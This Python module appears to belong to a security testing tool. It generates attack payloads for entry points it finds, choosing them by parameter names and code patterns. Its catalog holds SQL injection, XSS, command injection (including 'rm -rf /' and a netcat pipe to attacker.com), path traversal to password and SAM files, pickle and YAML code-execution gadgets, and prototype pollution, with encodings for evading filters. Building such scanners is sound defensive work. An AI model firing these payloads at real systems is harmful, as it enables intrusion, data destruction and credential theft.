"""vericlaw/payloads.py -- Context-aware attack payload generation.

Implements PayloadGenerator which produces context-sensitive attack payloads
for discovered entry points.  Payload selection is driven by:

* Parameter name heuristics  (``username`` -> SQLi / XSS, ...)
* Function body AST patterns   (``cursor.execute`` -> SQLi, ...)
* Framework indicators         (Flask, Django, FastAPI decorators / imports)
"""

from __future__ import annotations

import ast
import base64
import urllib.parse
from typing import Optional

from .models import Payload


# ---------------------------------------------------------------------------
# Static payload catalog -- at least 3 variants per type
# ---------------------------------------------------------------------------

_SQL_INJECTION = [
    ("' OR '1'='1' --", "classic tautology bypass", "critical"),
    ("'; DROP TABLE users; --", "stacked destructive query", "critical"),
    ("1 UNION SELECT * FROM passwords", "union data exfiltration", "critical"),
    ("' OR 1=1#", "hash-comment tautology", "critical"),
    ("admin'--", "comment-based authentication bypass", "high"),
    ("1'; DELETE FROM sessions WHERE '1'='1", "stacked deletion attack", "critical"),
]

_XSS = [
    ("<script>alert('xss')</script>", "classic reflected script tag", "high"),
    ("javascript:alert('xss')", "javascript pseudo-protocol", "medium"),
    ("<img src=x onerror=alert('xss')>", "image error handler injection", "high"),
    ('<body onload=alert("xss")>', "body onload event handler", "high"),
    ("<svg/onload=alert('xss')>", "svg onload vector", "high"),
    ('">><script>alert(document.cookie)</script>', "broken-tag script injection", "high"),
]

_COMMAND_INJECTION = [
    ("; cat /etc/passwd", "semicolon command chaining", "critical"),
    ("| whoami", "pipe to information disclosure", "critical"),
    ("$(id)", "command substitution", "critical"),
    ("`uname -a`", "backtick command substitution", "critical"),
    ("; rm -rf /", "destructive command chaining", "critical"),
    ("| nc attacker.com 9999", "reverse shell pipe", "critical"),
]

_PATH_TRAVERSAL = [
    ("../../../etc/passwd", "unix parent traversal", "high"),
    ("..\\..\\..\\windows\\system32\\config\\sam", "windows parent traversal", "high"),
    ("....//....//etc/shadow", "double-dot slash bypass", "high"),
    ("..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal", "high"),
    ("/etc/passwd%00", "null byte truncation (legacy)", "medium"),
    ("....\\\\....\\\\windows\\win.ini", "double-dot backslash bypass", "high"),
]

_FORMAT_STRING = [
    ("%s%s%s%s%s%s%s%s", "sequential format specifier crash", "medium"),
    ("%n", "write primitive via %n", "high"),
    ("%p %p %p %p", "stack memory disclosure", "medium"),
    ("%x.%x.%x.%x", "hex stack memory disclosure", "medium"),
    ("%99999999999s", "width specifier denial of service", "medium"),
    ("%s%p%x%d", "mixed specifier memory leak", "medium"),
]

_DESERIALIZATION = [
    (
        "cos\nsystem\np0\n(Vcalc.exe\np1\ntp2\nRp3\n.",
        "pickle os.system gadget (protocol 0)",
        "critical",
    ),
    (
        "cposix\nsystem\np0\n(Vid\np1\ntp2\nRp3\n.",
        "pickle posix.system gadget",
        "critical",
    ),
    (
        "!!python/object/apply:os.system ['id']",
        "yaml os.system apply tag",
        "critical",
    ),
    (
        '!!python/object/apply:subprocess.call [["python", "-c", "import os; os.system(\'sh\')"], {}]',
        "yaml subprocess.call apply tag",
        "critical",
    ),
    (
        '{"__proto__": {"polluted": true}}',
        "json prototype pollution via __proto__",
        "high",
    ),
    (
        '{"constructor": {"prototype": {"polluted": true}}}',
        "json prototype pollution via constructor",
        "high",
    ),
]

_PROTOTYPE_POLLUTION = [
    (
        '{"__proto__": {"isAdmin": true}}',
        "__proto__ admin privilege escalation",
        "critical",
    ),
    (
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        "constructor.prototype admin escalation",
        "critical",
    ),
    (
        '{"__proto__": {"canDelete": true}}',
        "__proto__ delete capability injection",
        "high",
    ),
    (
        '{"constructor": {"prototype": {"role": "admin"}}}',
        "constructor.prototype role injection",
        "critical",
    ),
    (
        '{"__proto__": {"debug": true, "exposeErrors": true}}',
        "__proto__ debug mode + error disclosure",
        "high",
    ),
    (
        '{"constructor": {"prototype": {"toString": "admin"}}}',
        "constructor.prototype toString hijacking",
        "high",
    ),
]

_CATALOG: dict[str, list[tuple[str, str, str]]] = {
    "sql_injection": _SQL_INJECTION,
    "xss": _XSS,
    "command_injection": _COMMAND_INJECTION,
    "path_traversal": _PATH_TRAVERSAL,
    "format_string": _FORMAT_STRING,
    "deserialization": _DESERIALIZATION,
    "prototype_pollution": _PROTOTYPE_POLLUTION,
}

# ---------------------------------------------------------------------------
# Entry-point heuristics
# ---------------------------------------------------------------------------

_PARAM_HEURISTICS: dict[str, list[str]] = {
    "username": ["sql_injection", "xss"],
    "user": ["sql_injection", "xss"],
    "name": ["sql_injection", "xss"],
    "email": ["sql_injection", "xss"],
    "password": ["sql_injection"],
    "query": ["sql_injection", "command_injection"],
    "search": ["sql_injection", "xss"],
    "id": ["sql_injection"],
    "filename": ["path_traversal"],
    "file": ["path_traversal"],
    "path": ["path_traversal"],
    "command": ["command_injection"],
    "cmd": ["command_injection"],
    "exec": ["command_injection"],
    "input": ["command_injection", "sql_injection", "xss"],
    "data": ["deserialization", "prototype_pollution"],
    "json": ["deserialization", "prototype_pollution"],
    "body": ["deserialization", "prototype_pollution", "xss"],
    "template": ["xss"],
    "message": ["xss", "format_string"],
    "format": ["format_string"],
    "content": ["xss", "deserialization"],
}

_BODY_PATTERNS: dict[str, list[str]] = {
    "cursor.execute": ["sql_injection"],
    "execute": ["sql_injection"],
    "raw": ["sql_injection"],
    "subprocess.call": ["command_injection"],
    "subprocess.run": ["command_injection"],
    "os.system": ["command_injection"],
    "os.popen": ["command_injection"],
    "render_template": ["xss"],
    "render_template_string": ["xss"],
    "mark_safe": ["xss"],
    "open(": ["path_traversal"],
    "pickle.loads": ["deserialization"],
    "yaml.load": ["deserialization"],
    "json.loads": ["deserialization"],
    "eval(": ["command_injection", "xss"],
    "exec(": ["command_injection"],
    "printf": ["format_string"],
    "sprintf": ["format_string"],
    "format(": ["format_string"],
    "%": ["format_string"],
}

_FRAMEWORK_PAYLOADS: dict[str, list[str]] = {
    "flask": ["xss", "command_injection", "path_traversal"],
    "django": ["sql_injection", "xss", "command_injection"],
    "fastapi": ["sql_injection", "xss", "command_injection", "path_traversal"],
    "tornado": ["xss", "command_injection"],
    "bottle": ["xss", "command_injection"],
}


# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------

def _applicable_types(entry_point) -> list[str]:
    """Determine which payload types are likely relevant for *entry_point*."""
    types: set[str] = set()

    for param in getattr(entry_point, "parameters", []):
        for key, vals in _PARAM_HEURISTICS.items():
            if key in param.lower():
                types.update(vals)

    source = getattr(entry_point, "source", "") or ""
    for pattern, vals in _BODY_PATTERNS.items():
        if pattern in source:
            types.update(vals)

    if not source:
        try:
            body = getattr(entry_point, "body", [])
            for node in body:
                node_src = ast.dump(node)
                for pattern, vals in _BODY_PATTERNS.items():
                    if pattern.replace("(", "") in node_src:
                        types.update(vals)
        except Exception:
            pass

    decorators = getattr(entry_point, "decorators", [])
    for dec in decorators:
        dec_lower = dec.lower()
        for fw, vals in _FRAMEWORK_PAYLOADS.items():
            if fw in dec_lower:
                types.update(vals)

    for indicator in getattr(entry_point, "risk_indicators", []):
        indicator_lower = indicator.lower()
        for fw, vals in _FRAMEWORK_PAYLOADS.items():
            if fw in indicator_lower:
                types.update(vals)

    if not types:
        types = {"sql_injection", "xss", "command_injection", "path_traversal"}

    return sorted(types)


def _encode_variants(raw: str) -> list[tuple[str, str]]:
    """Return (encoded_value, encoding_name) variants for *raw*."""
    variants = [(raw, "raw")]
    try:
        variants.append((base64.b64encode(raw.encode()).decode(), "base64"))
    except Exception:
        pass
    try:
        variants.append((urllib.parse.quote(raw, safe=""), "urlencode"))
    except Exception:
        pass
    try:
        variants.append((raw.encode("utf-8").hex(), "hex"))
    except Exception:
        pass
    try:
        variants.append(
            (
                "".join(f"\\u{ord(c):04x}" for c in raw),
                "unicode",
            )
        )
    except Exception:
        pass
    return variants


# ---------------------------------------------------------------------------
# PayloadGenerator
# ---------------------------------------------------------------------------

class PayloadGenerator:
    """Generate context-aware attack payloads for discovered entry points."""

    def generate_for(self, entry_point, vulnerability_type: str) -> list[Payload]:
        """Generate payloads targeting *vulnerability_type* for *entry_point*."""
        if vulnerability_type not in _CATALOG:
            return []

        raw_payloads = _CATALOG[vulnerability_type]
        results: list[Payload] = []

        for raw, description, severity in raw_payloads:
            for encoded, enc_name in _encode_variants(raw):
                ctx = f"{vulnerability_type} via {description} (encoding={enc_name})"
                results.append(
                    Payload(
                        content=encoded,
                        payload_type=vulnerability_type,
                        context=ctx,
                        encoding=enc_name,
                        severity=severity,
                    )
                )

        return results

    def generate_all(self, entry_point) -> dict[str, list[Payload]]:
        """Generate all applicable payload types for *entry_point*."""
        applicable = _applicable_types(entry_point)
        return {
            vtype: self.generate_for(entry_point, vtype)
            for vtype in applicable
        }
